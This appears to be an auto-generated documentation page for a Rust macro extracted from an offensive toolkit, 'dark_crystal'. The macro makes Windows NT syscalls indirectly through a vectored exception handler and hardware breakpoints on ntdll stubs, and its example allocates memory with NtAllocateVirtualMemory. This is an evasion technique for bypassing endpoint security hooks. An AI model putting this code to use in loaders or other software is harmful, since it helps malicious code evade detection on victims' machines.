# veh_gate_macro

| Field | Value |
|-------|-------|
| **Source** | `source-extracts/veh_gate_macro.rs` |
| **Lines** | 41 |

## Macros

- `veh_syscall!` (macro_rules, line 22)

## Key Dependencies

- `use $crate::veh_gate;`

## Full Source

```rust
// Source: dark_crystal/crowd/src/veh_gate.rs
// Technique: T002 - VEH Syscall Gate (HW breakpoint mediated syscalls)
// Tier: S | 5-step hardware breakpoint flow
//
// Flow: trigger ACCESS_VIOLATION → set DR0/DR1 on ntdll stub → single-step
// through ntdll → intercept at sub rsp pattern → redirect RIP to SYSCALL
// instruction → DR1 fires after RET → retrieve NTSTATUS from RAX.

/// Usage macro that resolves SSN by name, triggers VEH-mediated syscall,
/// and returns the NTSTATUS result.
///
/// ```ignore
/// veh_gate::initialize()?;
/// let status = veh_syscall!(
///     "NtAllocateVirtualMemory",
///     OrgNtAllocateVirtualMemory,       // type alias for the fn signature
///     process_handle, &mut base, 0usize, &mut size, alloc_type, protect
/// );
/// veh_gate::destroy();
/// ```
#[macro_export]
macro_rules! veh_syscall {
    ($name:expr, $fn_type:ty, $($arg:expr),* $(,)?) => {{
        use $crate::veh_gate;

        // Resolve SSN + stub address from ntdll exports
        let hash = $crate::resolve::djb2_hash($name.as_bytes());
        let (ssn, addr) = veh_gate::get_ssn_by_name($name, hash)
            .expect(concat!("VEH: failed to resolve ", $name));

        // Count args to determine if extended stack args are needed (>4)
        let arg_count = $crate::count_args!($($arg),*);
        let extended = arg_count > 4;

        // Trigger the VEH chain: ACCESS_VIOLATION → DR0/DR1 → SINGLE_STEP → syscall
        veh_gate::set_hw_bp(addr, extended, ssn);

        // The VEH handler stored the NTSTATUS in global state
        veh_gate::take_last_rax() as i32
    }};
}

```